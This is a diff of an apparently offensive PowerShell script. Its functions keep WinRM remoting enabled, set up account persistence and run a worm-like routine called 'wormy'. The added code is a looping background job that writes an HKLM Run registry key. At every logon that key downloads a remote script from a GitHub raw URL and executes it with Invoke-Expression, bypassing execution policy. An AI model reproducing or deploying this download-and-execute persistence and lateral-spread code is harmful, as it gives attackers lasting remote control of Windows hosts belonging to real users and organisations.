@@ -32,6 +32,8 @@ function accountPersist{
 
 
 }
+
+
 function keepWINRMAlive{
     While(1 -eq 1){
         Enable-PSRemote -force
@@ -72,9 +74,6 @@ function wormy{
         start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
     }
 }
-
-wormy
-
 start-job -ScriptBlock{
 
     While(1 -eq 1){
@@ -83,3 +82,19 @@ start-job -ScriptBlock{
 
     }
 }
+
+start-job -ScriptBlock { 
+    while(1 -eq 1){
+        try{
+            New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Incitatus" -Value "C:\system32\WindowsPowerShell\v1.0\powershell.exe -Command 'invoke-command -scriptblock {$alexander=invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 Invoke-Expression $alexander }' -NonInteractive -ExecutionPolicy Bypass"  -PropertyType "String"
+        
+        }
+        catch{
+            Set-Itemproperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Incitatus" -Value "C:\system32\WindowsPowerShell\v1.0\powershell.exe -Command 'invoke-command -scriptblock {$alexander=invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 Invoke-Expression $alexander }' -NonInteractive -ExecutionPolicy Bypass"
+        }
+        start-sleep -Seconds (get-random -Minimum 5 -Maximum 10)
+    }
+}
+
+wormy
+
